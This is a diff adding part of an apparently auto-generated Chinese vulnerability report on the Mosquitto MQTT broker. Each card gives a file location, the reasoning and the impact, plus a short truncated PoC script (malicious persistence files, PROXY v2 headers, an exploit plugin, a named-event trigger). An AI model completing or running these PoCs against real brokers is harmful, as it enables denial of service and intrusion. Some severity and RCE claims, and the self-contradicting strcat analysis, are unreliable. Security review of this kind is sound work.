+#define write_e(f, b, c) if(fwrite(b, 1, c, f) != c){ goto error; }</code></pre>
+                <p><strong>数据流:</strong> 这些宏在读取/写入持久化数据时，直接信任文件中的长度字段，未对数据内容进行任何有效性验证。</p>
+                <p><strong>判断理由:</strong> Mosquitto的持久化文件可能被攻击者篡改。如果攻击者能够修改持久化文件，可以构造恶意的chunk长度、字符串长度等字段，导致读取函数分配过大的内存（拒绝服务）或读取超出预期范围的数据（信息泄露）。虽然代码中有goto error机制，但错误处理可能不完整，且某些情况下可能导致部分数据被错误解析。</p>
+                <p><strong>影响分析:</strong> 成功利用此漏洞可导致以下影响：
+1. 拒绝服务(DoS)：通过设置超大payloadlen字段，导致Mosquitto在启动时尝试分配数GB内存，触发OOM killer或内存分配失败，使服务无法正常启动。
+2. 信息泄露：通过设置超大的字符串长度字段（如topic_len），导致读取函数读取超出文件范围的数据，可能泄露堆内存中的敏感信息。
+3. 服务崩溃：恶意构造的数据可能导致解析过程中的段错误或其他未定义行为。
+4. 持久化数据损坏：即使服务能够启动，错误解析的数据可能导致后续操作异常，影响MQTT消息的投递和订阅管理。
+
+注意：该漏洞利用需要攻击者已经获得对持久化文件的写入权限，通常意味着攻击者已经获得了系统的一定控制权。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+Mosquitto持久化文件篡改PoC - 仅供安全研究使用
+
+该PoC演示如何通过篡改Mosquitto持久化文件中的长度字段，
+导致服务在重启读取持久化数据时发生拒绝服务或信息泄露。
+&quot;&quot;&quot;
+
+import struct
+import os
+import sys
+
+# Mosquitto持久化文件魔数 (magic bytes)
+MAGIC = b&#x27;mosquitto_db\x00\x00\x00\x00\x00&#x27;
+
+# DB chunk类型定义
+DB_CHUNK_CFG = 1
+DB_CHUNK_BASE_MSG = 2
+DB_CHUNK_CLIENT_MSG = 3
+DB_CHUNK_RETAIN = 4
+DB_CHUNK_SUB = 5
+DB_CHUNK_CLIENT = 6
+
+# PF_header结构: chunk(uint32) + length(uint32) = 8字节
+PF_HEADER_FORMAT = &#x27;&lt;II&</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-5302D675 - 潜在的内存泄漏（错误路径资源释放不完整）</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> src/persist.h:37</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>#define read_e(f, b, c) if(fread(b, 1, c, f) != c){ rc = MOSQ_ERR_UNKNOWN; goto error; }</code></pre>
+                <p><strong>数据流:</strong> 宏中的goto error跳转可能导致已分配的内存或打开的文件句柄未被正确释放。</p>
+                <p><strong>判断理由:</strong> 在多个读取函数中，可能在调用read_e之前已经分配了内存（如通过persist__read_string分配clientid）。如果read_e失败触发goto error，但error标签处的清理代码可能不完整，导致内存泄漏。长期运行的服务可能因此耗尽内存。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者通过构造恶意的持久化文件，触发Mosquitto在加载持久化数据时的内存泄漏。每次加载失败会泄漏约100+字节的内存（clientid和username）。在长期运行或频繁重启的情况下，这种泄漏会导致Mosquitto进程的内存使用量持续增长，最终可能导致内存耗尽（OOM），造成服务拒绝服务（DoS）。由于Mosquitto常用于物联网和嵌入式系统，这些系统的内存资源通常有限，因此该漏洞的影响更为严重。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC for VULN-5302D675 - Mosquitto Persist Memory Leak
+仅供研究使用
+
+该PoC通过构造恶意的持久化文件，触发read_e宏中的goto error路径，
+导致已分配的内存未被释放，造成内存泄漏。
+&quot;&quot;&quot;
+
+import struct
+import os
+import sys
+import tempfile
+
+# Mosquitto持久化文件魔数
+MAGIC = b&#x27;mosquitto_db&#x27;
+
+def create_malicious_persist_file(output_path):
+    &quot;&quot;&quot;
+    构造一个恶意的Mosquitto持久化文件，触发内存泄漏。
+    
+    原理：
+    1. 在client chunk中，先通过persist__read_string分配clientid内存
+    2. 然后调用read_e读取后续数据
+    3. </code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #dc3545;">
+                <h3>VULN-C3AB25C8 - 整数溢出/缓冲区溢出</h3>
+                <span class="severity" style="background:#dc3545;color:white;padding:2px 8px;border-radius:3px;">CRITICAL</span>
+                <p><strong>文件:</strong> src/persist_read_v5.c:103</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>length -= (uint32_t)(sizeof(struct PF_client_msg) + chunk-&gt;F.id_len);
+if(length &gt; MQTT_MAX_PAYLOAD){
+    goto error;
+}</code></pre>
+                <p><strong>数据流:</strong> 从文件读取的chunk-&gt;F.id_len是ntohs转换后的16位值，但转换为uint32_t后与sizeof相加，可能导致整数下溢。如果id_len大于length，length会变成非常大的正数，绕过MQTT_MAX_PAYLOAD检查。</p>
+                <p><strong>判断理由:</strong> length是uint32_t类型，当减去的值大于length时会发生整数下溢，导致length变成非常大的值，从而绕过后续的MQTT_MAX_PAYLOAD检查。攻击者可以通过构造恶意的持久化文件触发此漏洞，导致后续的malloc分配过大内存或读取越界数据。</p>
+                <p><strong>影响分析:</strong> 成功利用此漏洞可导致 Mosquitto broker 在启动时分配超大内存，造成拒绝服务。具体影响包括：1) 内存耗尽导致系统不稳定或崩溃；2) 后续的 read_e 操作可能读取越界数据，导致信息泄露；3) 如果下溢后的 length 恰好小于 MQTT_MAX_PAYLOAD，攻击者可以精确控制后续内存分配和读取操作，可能实现更复杂的攻击。漏洞严重性为 Critical，CVSS 评分约 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC for VULN-C3AB25C8 - Integer Underflow in persist__chunk_client_msg_read_v56
+
+仅供安全研究使用。
+&quot;&quot;&quot;
+
+import struct
+import sys
+import os
+
+def create_malicious_persist_file(output_path):
+    &quot;&quot;&quot;
+    构造恶意持久化文件，触发整数下溢漏洞。
+    
+    漏洞原理：
+    persist__chunk_client_msg_read_v56 函数中：
+    length -= (uint32_t)(sizeof(struct PF_client_msg) + chunk-&gt;F.id_len)
+    
+    当 chunk-&gt;F.id_len &gt; length 时，length 发生整数下溢，
+    变成接近 UINT32_MAX 的大</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-99EF9520 - 整数溢出/截断</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> src/persist_write.c:219</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>sub_chunk.F.topic_len = (uint16_t)strlen(thistopic);</code></pre>
+                <p><strong>数据流:</strong> thistopic由topic和node-&gt;topic拼接而成，可能超过65535字节</p>
+                <p><strong>判断理由:</strong> 与上述类似，size_t到uint16_t的强制转换可能导致数据截断</p>
+                <p><strong>影响分析:</strong> 该整数截断漏洞允许攻击者通过发送超长主题的订阅请求，触发Broker在持久化订阅信息时的数据截断。具体影响包括：1) 持久化数据损坏：存储的topic_len值小于实际主题长度，导致后续读取时只能获取部分主题内容；2) 解析错误：Broker重启后从持久化文件恢复订阅信息时，可能因数据不完整导致解析失败或崩溃；3) 功能异常：受影响的订阅可能无法正常工作，导致消息路由错误或丢失；4) 潜在的安全风险：如果截断后的数据被用于后续的内存操作，可能引发缓冲区溢出等更严重的问题。虽然漏洞评级为medium，但在特定配置下可能导致服务中断或数据一致性问题。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC for VULN-99EF9520 - Integer truncation in persist__subs_save
+
+仅供研究使用 (For research purposes only)
+&quot;&quot;&quot;
+
+import socket
+import struct
+import sys
+
+# 目标MQTT Broker配置
+BROKER_HOST = &quot;127.0.0.1&quot;
+BROKER_PORT = 1883
+
+# 构造一个超长主题，长度超过65535字节
+# 使用重复的&#x27;A&#x27;字符填充
+TOPIC_BASE = &quot;test/&quot;
+# 计算需要填充的字符数，使总长度超过65535
+# 主题格式: &quot;test/&quot; + 重复的&#x27;A&#x27; * N
+TARGET_LENGTH = 65536  # 超过uint16_t最大值
+PADDING_LENGTH = TARGET_LENGTH</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #dc3545;">
+                <h3>VULN-4953569C - Use-After-Free / Double-Free</h3>
+                <span class="severity" style="background:#dc3545;color:white;padding:2px 8px;border-radius:3px;">CRITICAL</span>
+                <p><strong>文件:</strong> src\plugin_message.c:49</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>if(stored-&gt;topic != event_data.topic){
+    if(to_free-&gt;topic){
+        mosquitto_FREE(stored-&gt;topic);
+    }
+    stored-&gt;topic = event_data.topic;
+    to_free-&gt;topic = true;
+}</code></pre>
+                <p><strong>数据流:</strong> plugin__handle_message_single() 接收 callbacks 回调列表，在 DL_FOREACH_SAFE 循环中依次调用每个回调函数。回调函数可以修改 event_data 中的 topic/payload/properties 指针。当回调修改了这些指针后，代码会释放旧的指针并更新为新的指针。但存在以下问题：1) 多个回调可能共享同一个 event_data 结构体，第一个回调释放了旧指针后，第二个回调可能再次尝试释放同一个指针；2) 回调函数可能返回 event_data 中指向已被释放内存的指针。</p>
+                <p><strong>判断理由:</strong> 在 DL_FOREACH_SAFE 循环中，多个回调函数依次执行。每个回调都可以修改 event_data 中的 topic、payload、properties 指针。当第一个回调修改了 topic 指针后，代码会释放旧的 stored-&gt;topic 并更新为新的指针。但第二个回调可能再次修改 event_data.topic，此时 stored-&gt;topic 已经是第一个回调设置的新值，如果第二个回调将 event_data.topic 设置为之前已被释放的旧指针，就会导致 use-after-free。此外，如果两个回调都修改了同一个字段，且 to_free 标志已被设置为 true，第二个回调会尝试释放已经被第一个回调释放的内存，导致 double-free。</p>
+                <p><strong>影响分析:</strong> 成功利用此漏洞可导致：1) 远程代码执行 - 通过精心构造的指针操作，攻击者可能控制程序执行流；2) 拒绝服务 - 触发段错误导致 Mosquitto 服务器崩溃；3) 信息泄露 - use-after-free 可能泄露敏感内存数据；4) 内存损坏 - double-free 破坏堆结构，可能导致后续任意内存写入。由于 Mosquitto 是 MQTT 代理服务器，漏洞利用可能导致所有连接的客户端服务中断。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC for VULN-4953569C - Use-After-Free / Double-Free in Mosquitto
+ * Plugin Message Handling
+ * 
+ * 仅供研究使用 - For Research Purposes Only
+ * 
+ * 编译: gcc -shared -fPIC -o exploit_plugin.so exploit_plugin.c
+ * 使用: 在 mosquitto.conf 中添加 plugin /path/to/exploit_plugin.so
+ */
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;mosquitto_plugin.h&gt;
+#include &lt;mosquitto_broker.h&gt;
+
+/* 全局变量用于保存被释放的指针 */
+static char *freed_topic = NULL;
+static int callback_</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-43640FB4 - Memory Leak</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> src\plugin_message.c:49</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>if(stored-&gt;topic != event_data.topic){
+    if(to_free-&gt;topic){
+        mosquitto_FREE(stored-&gt;topic);
+    }
+    stored-&gt;topic = event_data.topic;
+    to_free-&gt;topic = true;
+}</code></pre>
+                <p><strong>数据流:</strong> 当回调函数修改了 event_data.topic 但返回非 MOSQ_ERR_SUCCESS 时，循环会提前退出。此时 to_free-&gt;topic 可能已被设置为 true，但 stored-&gt;topic 指向的是回调设置的新指针。调用者无法知道是否需要释放这个新指针。</p>
+                <p><strong>判断理由:</strong> 在 plugin__handle_message_single() 中，如果某个回调返回错误（rc != MOSQ_ERR_SUCCESS），循环会立即 break。此时如果该回调已经修改了 topic/payload/properties 并设置了 to_free 标志，那么新分配的指针会被存储在 stored 结构中，但调用者可能不会释放这些新指针，导致内存泄漏。特别是在 plugin__handle_message_in() 中，to_free 初始化为 {true, true, true}，但错误路径下新指针的释放逻辑不明确。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许通过恶意插件回调触发内存泄漏。每次触发泄漏的大小取决于回调分配的内存大小（topic字符串、payload缓冲区、properties链）。长期运行可导致broker内存耗尽，造成拒绝服务(DoS)。在插件回调频繁被调用的场景下（如高吞吐量消息系统），内存泄漏速度会显著加快。虽然需要插件注册权限，但结合其他漏洞（如未授权插件加载）可扩大攻击面。CVSS评分估计为5.5（中等），主要影响可用性。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC代码 - 仅供研究使用
+ * 漏洞: Mosquitto Broker 插件消息处理内存泄漏
+ * 漏洞ID: VULN-43640FB4
+ * 
+ * 此PoC演示了通过恶意插件回调触发内存泄漏的路径
+ */
+
+#include &lt;mosquitto.h&gt;
+#include &lt;mosquitto_broker.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+/* 恶意插件回调 - 修改topic并返回错误码 */
+int malicious_callback(int event, void *event_data, void *userdata)
+{
+    struct mosquitto_evt_message *msg = (struct mosquitto_evt_message *)event_data;
+    
+    /* 分配新topic - 模拟恶意行为 */
+    char *new_topic = str</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-01ADD1DB - 整数溢出/截断</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> src/proxy_v2.c:155</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>len = (uint16_t)(len - (sizeof(uint8_t) + sizeof(uint8_t) + sizeof(uint8_t) + tlv_len));
+context-&gt;proxy.pos = (uint16_t)(context-&gt;proxy.pos + tlv_len);</code></pre>
+                <p><strong>数据流:</strong> 用户控制的tlv_len -&gt; 计算剩余长度和位置 -&gt; uint16_t截断</p>
+                <p><strong>判断理由:</strong> len和pos的减法/加法操作后强制转换为uint16_t，当tlv_len大于len时会导致负数截断为很大的正数，破坏循环控制逻辑。</p>
+                <p><strong>影响分析:</strong> 成功利用此漏洞可导致：1) 服务器崩溃（拒绝服务）；2) 内存越界读取，可能泄露敏感信息（如TLS证书、用户名等）；3) 在特定条件下可能实现远程代码执行。由于漏洞位于网络协议解析的早期阶段，攻击者无需认证即可触发。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC for VULN-01ADD1DB - Integer truncation in read_tlv_ssl
+仅供研究使用
+&quot;&quot;&quot;
+import socket
+import struct
+import sys
+
+def build_malicious_proxy_header():
+    &quot;&quot;&quot;
+    构造恶意PROXY协议v2头部，触发整数截断漏洞
+    
+    漏洞原理：
+    在read_tlv_ssl函数中，当处理SSL TLV时，以下代码存在整数截断：
+    len = (uint16_t)(len - (sizeof(uint8_t) + sizeof(uint8_t) + sizeof(uint8_t) + tlv_len));
+    context-&gt;proxy.pos = (uint16_t)(context-&gt;proxy.pos + tlv_len);
+    
+    当tlv_len大于</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-39538114 - 整数溢出/截断</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> src/proxy_v2.c:183</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>context-&gt;proxy.pos = (uint16_t)(context-&gt;proxy.pos + tlv_len);</code></pre>
+                <p><strong>数据流:</strong> 用户控制的tlv_len -&gt; 更新pos -&gt; uint16_t截断</p>
+                <p><strong>判断理由:</strong> pos累加tlv_len后强制转换为uint16_t，可能导致溢出，使pos值回绕到较小值，绕过后续边界检查。</p>
+                <p><strong>影响分析:</strong> 成功利用此漏洞可导致：1) 越界读取proxy.buf缓冲区外的内存，泄露敏感信息(如其他连接的数据、内存中的密钥等)；2) 在特定条件下可能实现越界写入，通过控制tlv_len和pos值，使后续的字符串复制操作(mosquitto_strndup)读取或写入越界内存；3) 可能导致拒绝服务(段错误)或远程代码执行(如果攻击者能控制越界写入的内容)。CVSS评分约7.5(高严重性)。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC for VULN-39538114 - Integer truncation in PROXY v2 header parsing
+仅供研究使用 - For research purposes only
+&quot;&quot;&quot;
+import socket
+import struct
+import sys
+
+# PROXY v2 header signature
+PROXY_SIG = b&#x27;\x0D\x0A\x0D\x0A\x00\x0D\x0A\x51\x55\x49\x54\x0A&#x27;
+
+# PROXY command: LOCAL (0x00) or PROXY (0x01)
+PROXY_CMD_PROXY = 0x21  # ver_cmd: version=2, cmd=PROXY
+
+# Address family: TCP over IPv4
+PROXY_TCP_IPV4 = 0x11  # fam: TCP, IPv4
+
+def build_expl</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-7B0D7EB3 - 不安全的密码存储 - 明文密码</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> src\psk_file.c:120</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>psk-&gt;password = mosquitto_strdup(password);</code></pre>
+                <p><strong>数据流:</strong> 从PSK文件中读取的密码以明文形式存储在内存中。</p>
+                <p><strong>判断理由:</strong> PSK密码以明文形式存储在内存中，如果攻击者能够读取进程内存（如通过core dump、调试接口或内存分析工具），可以直接获取所有PSK凭据。建议在验证后立即清除敏感数据，或使用加密存储。</p>
+                <p><strong>影响分析:</strong> 攻击者可以获取所有PSK凭据，从而冒充任何PSK用户连接MQTT broker。这可能导致：1) 未经授权的MQTT消息发布/订阅；2) 敏感数据泄露；3) 系统被控制；4) 横向移动攻击。由于PSK凭据通常用于设备身份验证，攻击者可以完全绕过身份验证机制。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC: 不安全的密码存储 - 明文密码
+漏洞ID: VULN-7B0D7EB3
+目标: Mosquitto MQTT Broker PSK密码明文存储
+仅供研究使用
+&quot;&quot;&quot;
+
+import os
+import sys
+import subprocess
+import tempfile
+import signal
+import time
+
+# 前置条件：需要能够访问运行Mosquitto broker的进程内存
+# 本PoC演示通过core dump获取明文密码
+
+def create_psk_file():
+    &quot;&quot;&quot;创建包含PSK凭据的测试文件&quot;&quot;&quot;
+    psk_content = &quot;&quot;&quot;# PSK file for testing
+client1:secretpassword123
+client2:anothersecret456
+admin:supersecret789</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-4E539235 - 缓冲区溢出 - strncpy未正确终止字符串</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> src/retain.c:47</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>if(len &gt; 0){
+	strncpy(child-&gt;topic, topic, (size_t)(len+1));
+}</code></pre>
+                <p><strong>数据流:</strong> topic参数从外部传入 -&gt; retain__add_hier_entry函数 -&gt; strncpy复制到child-&gt;topic缓冲区</p>
+                <p><strong>判断理由:</strong> strncpy的第三个参数指定了要复制的最大字符数，这里使用len+1。但child结构体分配的大小是sizeof(struct mosquitto__retainhier) + len + 1，其中topic字段位于结构体末尾的灵活数组成员。如果len等于topic的实际长度，strncpy会复制len+1个字符，但缓冲区大小只有len+1字节，可能导致缺少空终止符。当len为0时，strncpy不会复制任何内容，topic字段保持未初始化状态。</p>
+                <p><strong>影响分析:</strong> 该漏洞可能导致以下影响：1) 信息泄露：未正确终止的topic字符串可能导致后续操作读取到相邻内存区域的数据，可能泄露敏感信息；2) 拒绝服务：如果读取到无效内存地址，可能导致broker崩溃；3) 潜在代码执行：在特定条件下，如果topic字符串被用于后续的内存操作，可能被利用实现任意代码执行。由于漏洞位于retain消息处理的关键路径，任何发布保留消息的客户端都可能触发此漏洞。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC代码 - 仅供安全研究使用
+ * 漏洞: Mosquitto Broker retain.c 中 strncpy 未正确终止字符串
+ * 影响版本: Mosquitto &lt;= 2.0.14 (需确认具体受影响版本)
+ */
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;mosquitto.h&gt;
+
+/*
+ * 漏洞利用原理:
+ * 在 retain__add_hier_entry 函数中，当 len &gt; 0 时，
+ * strncpy(child-&gt;topic, topic, (size_t)(len+1)) 会复制 len+1 个字符
+ * 但 child 结构体分配的大小为 sizeof(struct mosquitto__retainhier) + len + 1
+ * 其中 topic 是灵活数组成员，大小为 len+1 字节
+ * 当 len 等于 topic 实际长度时，strncpy 复制 len+</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-439D17BB - 缓冲区溢出 - strcat未检查边界</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> src\service.c:103</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>rc = GetEnvironmentVariable(env_name, conf_path, MAX_PATH);
+if(!rc || rc == MAX_PATH){
+    service_status.dwCurrentState = SERVICE_STOPPED;
+    SetServiceStatus(service_handle, &amp;service_status);
+    return;
+}
+strcat(conf_path, &quot;\\mosquitto.conf&quot;);</code></pre>
+                <p><strong>数据流:</strong> 环境变量 env_name 的值通过 GetEnvironmentVariable 读取到 conf_path 缓冲区（大小 MAX_PATH+20），但 strcat 追加 &quot;\mosquitto.conf&quot; 时未检查剩余空间。如果环境变量值恰好为 MAX_PATH 长度，strcat 会写入超出缓冲区边界的数据。</p>
+                <p><strong>判断理由:</strong> conf_path 缓冲区大小为 MAX_PATH+20，GetEnvironmentVariable 最多读取 MAX_PATH 字节。当环境变量长度为 MAX_PATH 时，缓冲区已满，strcat 追加 &quot;\mosquitto.conf&quot;（14字节）会写入超出缓冲区边界，导致栈缓冲区溢出。虽然代码检查了 rc == MAX_PATH 的情况，但 rc 返回的是实际写入的字符数（不包括空终止符），当环境变量长度为 MAX_PATH-1 时，rc=MAX_PATH-1，strcat 仍会写入14字节，总长度为 MAX_PATH-1+14 = MAX_PATH+13，超出 MAX_PATH+20 的可能性较小，但仍有风险。更严重的是，如果环境变量长度为 MAX_PATH，rc=MAX_PATH，代码会提前返回，但文档中 GetEnvironmentVariable 返回 MAX_PATH 表示缓冲区不足，此时 conf_path 内容可能不完整，但不会溢出。真正的风险在于环境变量长度为 MAX_PATH-14 到 MAX_PATH-1 之间时，strcat 会导致溢出。</p>
+                <p><strong>影响分析:</strong> 成功利用此漏洞可导致 Mosquitto Broker 服务崩溃（拒绝服务），或在精心构造 payload 的情况下实现远程代码执行。由于漏洞位于服务主函数中，溢出可能覆盖返回地址、SEH 链或其他关键数据结构，允许攻击者在 SYSTEM 权限下执行任意代码。考虑到 Mosquitto 常用于 IoT 和边缘计算场景，成功利用可能导致整个消息基础设施被控制。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC for VULN-439D17BB - Mosquitto Broker Service Configuration Buffer Overflow
+仅供研究使用 (For Research Purposes Only)
+&quot;&quot;&quot;
+import os
+import sys
+import subprocess
+import ctypes
+from ctypes import wintypes
+
+# 配置目标服务名称（默认为 mosquitto）
+SERVICE_NAME = &quot;mosquitto&quot;
+
+# 环境变量名称（根据代码逻辑生成）
+ENV_VAR_NAME = f&quot;{SERVICE_NAME.upper()}_DIR&quot;
+
+# 缓冲区大小常量
+MAX_PATH = 260
+BUFFER_SIZE = MAX_PATH + 20  # 280 bytes
+
+# 要追加的字符串长度
+APPEND_STR = &quot;\\mos</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #28a745;">
+                <h3>VULN-CAB093B2 - 不安全的字符串处理 - strrchr和strcasecmp使用</h3>
+                <span class="severity" style="background:#28a745;color:white;padding:2px 8px;border-radius:3px;">LOW</span>
+                <p><strong>文件:</strong> src\service.c:33</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>static char *fix_name(char *name)
+{
+    size_t len;
+
+    if(strrchr(name, &#x27;\\&#x27;)){
+        name = strrchr(name, &#x27;\\&#x27;) + 1;
+    }
+    len = strlen(name);
+    if(!strcasecmp(&amp;name[len-4], &quot;.exe&quot;)){
+        name[len-4] = &#x27;\0&#x27;;
+    }
+
+    return name;
+}</code></pre>
+                <p><strong>数据流:</strong> 函数 fix_name 接收一个字符串指针，查找最后一个反斜杠并截取其后部分，然后检查最后4个字符是否为 &quot;.exe&quot; 并截断。当 name 长度小于4时，&amp;name[len-4] 会访问负索引，导致越界读取。</p>
+                <p><strong>判断理由:</strong> 如果传入的 name 字符串长度小于4（例如 &quot;a&quot;），len=1，len-4=-3，&amp;name[-3] 会访问字符串起始地址之前的3个字节，导致未定义行为。虽然在实际使用中 lpszArgv[0] 通常是完整的路径名，长度通常大于4，但理论上存在风险。此外，函数修改了传入的字符串（name[len-4] = &#x27;\0&#x27;），如果传入的是字符串常量会导致程序崩溃。</p>
+                <p><strong>影响分析:</strong> 该漏洞影响Mosquitto MQTT Broker的Windows服务组件。主要影响包括：1) 当传入长度小于4的字符串时，&amp;name[len-4]导致负索引越界读取，这是明确的未定义行为，可能导致读取栈上或堆上的敏感数据，或在特定内存布局下被利用执行任意代码；2) 函数修改传入字符串内容（name[len-4] = &#x27;\0&#x27;），若传入字符串常量会导致程序崩溃，造成拒绝服务。虽然该函数仅在服务初始化时被调用，且实际使用中lpszArgv[0]通常是完整路径名，但攻击者仍可能通过控制服务参数（如创建服务时设置短路径名）触发该漏洞。由于漏洞影响的是服务启动阶段，成功利用可能导致服务无法启动或崩溃，影响MQTT服务的可用性。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC代码 - 仅供研究使用
+ * 漏洞: Mosquitto Broker Windows服务 fix_name()函数不安全的字符串处理
+ * 文件: src/service.c
+ * 行号: 33
+ * 描述: 当传入字符串长度小于4时，&amp;name[len-4]导致负索引越界读取
+ *       同时函数修改传入字符串，若传入字符串常量会导致崩溃
+ */
+
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+
+/* 复现漏洞函数 */
+static char *fix_name(char *name)
+{
+    size_t len;
+
+    if(strrchr(name, &#x27;\\&#x27;)){
+        name = strrchr(name, &#x27;\\&#x27;) + 1;
+    }
+    len = strlen(name);
+    
+    /* 漏洞点: 当len &lt; 4时，len-4为负数，&amp</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-83DE1060 - Windows命名事件竞态条件</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> src\signals.c:131</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>for(int i=0; i&lt;MOSQ_MAX_EVTS; i++){
+		sprintf_s(evt_name, MAX_PATH, &quot;mosq%d_%s&quot;, pid, evt_names[i]);
+		evt[i] = CreateEvent(NULL, FALSE, FALSE, evt_name);
+	}</code></pre>
+                <p><strong>数据流:</strong> 使用进程PID创建命名事件对象，格式为&#x27;mosq&lt;PID&gt;_&lt;event_name&gt;&#x27;。任何知道PID的本地用户都可以打开这些事件并触发信号。</p>
+                <p><strong>判断理由:</strong> Windows命名事件对象默认允许同一用户账户下的其他进程访问。如果攻击者知道mosquitto进程的PID（可以通过任务管理器或其他方式获取），就可以使用OpenEvent()打开这些命名事件并调用SetEvent()来触发信号，从而控制mosquitto进程的行为（如触发重新加载配置、备份数据库、关闭进程等）。这可能导致拒绝服务或配置篡改。虽然需要本地访问权限，但这是一个安全设计缺陷。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许本地攻击者通过触发命名事件来控制Mosquitto服务的行为，具体影响包括：
+1. **拒绝服务攻击**：通过触发shutdown事件（index=0）关闭Mosquitto进程，导致MQTT服务中断
+2. **配置篡改**：通过触发reload事件（index=1）重新加载配置文件，如果攻击者事先修改了配置文件，可能导致服务异常或安全配置被绕过
+3. **数据泄露风险**：通过触发tree_print事件（index=4）打印订阅树到日志，可能泄露MQTT主题订阅信息
+4. **性能影响**：通过触发backup事件（index=2）触发数据库备份，可能影响服务性能
+5. **日志污染**：通过触发log_rotate（index=3）和xtreport（index=5）事件，可能干扰日志审计
+
+由于这些操作不需要管理员权限，普通用户账户即可执行，因此这是一个严重的安全设计缺陷。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC: Mosquitto Windows Named Event Exploitation
+ * 仅供研究使用 - 仅用于安全审查
+ * 
+ * 编译: cl.exe mosquitto_event_poc.c
+ * 或: gcc -o mosquitto_event_poc.exe mosquitto_event_poc.c -luser32
+ */
+
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;tlhelp32.h&gt;
+#include &lt;string.h&gt;
+
+#define MOSQ_MAX_EVTS 6
+
+// 事件名称后缀映射
+const char *evt_names[MOSQ_MAX_EVTS] = {
+    &quot;shutdown&quot;,     // 关闭进程
+    &quot;reload&quot;,       // 重新加载配置
+    &quot;backup&quot;,       // 备份数据库
+    &quot;l</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
